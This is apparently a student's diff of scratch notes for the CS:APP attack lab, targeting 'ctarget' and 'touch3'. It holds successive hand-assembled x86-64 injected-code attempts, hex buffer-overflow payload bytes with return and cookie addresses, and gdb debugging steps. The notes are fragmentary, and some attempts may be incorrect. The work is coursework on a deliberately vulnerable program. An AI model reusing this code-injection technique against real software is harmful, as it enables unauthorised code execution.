+48 89 24 c4
+48 8d 64 24 10
+c3 00 00 00 00 00
+00 00 00 00 00
+98 8d 61 55 00 00 00 00
+ee b3 55 55 55 55 00 00
+33 32 33 31 66 30 34 34
+2a 5f 55 55 55 55 00
+
+---------------------
+
+
+mov     %rsp, (%rsp, %rax, 4)
+lea     0x10(%rsp), %rsp
+ret
+
+48 8b 3c 24
+48 89 24 84
+48 8d 64 24 10
+c3 00 00 00 00 00
+00 00 00 00 00
+98 8d 61 55 00 00 00 00
+ee b3 55 55 55 55 00 00
+33 32 33 31 66 30 34 34
+2a 5f 55 55 55 55 00
+
+---------------------
+mov      %rsp, (%rdi, %rax, 8)
+lea     0x10(%rsp), %rsp
+ret
+
+48 8b 3c 24
+48 89 24 c7
+48 8d 64 24 10
+c3 00 00 00 00 00
+00 00 00 00 00
+98 8d 61 55 00 00 00 00
+ee b3 55 55 55 55 00 00
+33 32 33 31 66 30 34 34
+2a 5f 55 55 55 55 00
+
+---------------------
+mov     %rsp, (%rdi, %rax, 8)
+movb    $0xc0, (%rsp)
+lea     0x10(%rsp), %rsp
+ret
+
+48 8b 3c 24
+48 89 24 c7
+c6 04 24 c0
+48 8d 64 24 10
+c3 00
+00 00 00 00 00
+98 8d 61 55 00 00 00 00
+ee b3 55 55 55 55 00 00
+33 32 33 31 66 30 34 34
+2a 5f 55 55 55 55 00
+
+---------------------
+48 8b 3c 24
+movl     $0x31333233, (%rdi, %rax, 4)
+movl     $0x34343066, (%rdi, %rax, 4)
+lea     0x10(%rsp), %rsp
+ret
+
+c7 04 87 33 32 33 31
+c7 04 87 66 30 34 34
+48 8d 64 24 10
+c3 00
+
+movw      r0, #0x5678      @ r0 = 0x00005678
+movt      r0, #0x1234      @ r0 = (r0 & 0x0000FFFF) | 0x12340000 (=0x12345678)
+
+----------------------
+
+movl     $0x34343066, (%rdi, %rax, 4)
+lea      -0x4(%rdi), %rdi
+movl     $0x31333233, (%rdi, %rax, 4)
+lea      0x4(%rdi), %rdi
+lea      -0x10(%rsp), %rsp
+ret
+
+
+
+66 66 66 66 66 66 66 66
+33 32 33 31 66 30 34 34     // str
+2a 5f 55 55 55 55 00 00     // touch3
+c8 8d 61 55 00 00 00 00     // inj code addr
+f2 b3 55 55 55 55 00 00     // str store addr
+11 66 55 55 55 55 00 00
+48 8b 3c 24                 // load addr rdi
+c7 04 87 66 30 34 34        // 2 part cookie
+48 8d 7f fc
+c7 04 87 33 32 33 31        // 1 part cookie
+48 8d 7f 04                 // mov cookie addr back
+48 8d 64 24 f0              // rsp
+c3
+
+
+
+
+66 66 66 66 66 66 66 66
+33 32 33 31 66 30 34 34
+2a 5f 55 55 55 55 00 00
+c8 8d 61 55 00 00 00 00
+f2 b3 55 55 55 55 00 00
+11 66 55 55 55 55 00 00
+48 8b 3c 24            
+c7 04 87 66 30 34 34   
+48 8d 7f fc
+c7 04 87 33 32 33 31  
+48 8d 7f 04 
+48 8d 64 24 f0         
+c3
+
+
+nano strs.txt
+./hex2raw < strs.txt > exploits.txt
+
+
+gdb ctarget
+
+b *(getbuf+25)
+run < exploits.txt -q
+
+watch $rip
+watch $rsp
+watch $rdi
+
+x/64xb 0x55618d98
+x/64xb $rdi 
+
+b *(touch3+27)
+b *(touch3+32)
+b *(getbuf+25)
+run < exploits.txt -q
+
+
+0x55618d98:
+0x55618da0: str
+0x55618da8: touch3
+0x55618db0: inj code
+0x55618db8: str store add
+0x55618dc0: --
+0x55618dc8: code start
+0x55618dd0:
+
+
+
+
+//---------
+rip = 0x55618d98
+rsp = 0x55618db8
+rdi = 
+
+
+
+// if i had just accepted from the beginning that testing that (overwriting
+// the 0xf4 stuff) would have taken 3 seconds, trying everything else first,
+// that would have saked a lot of time but alright then
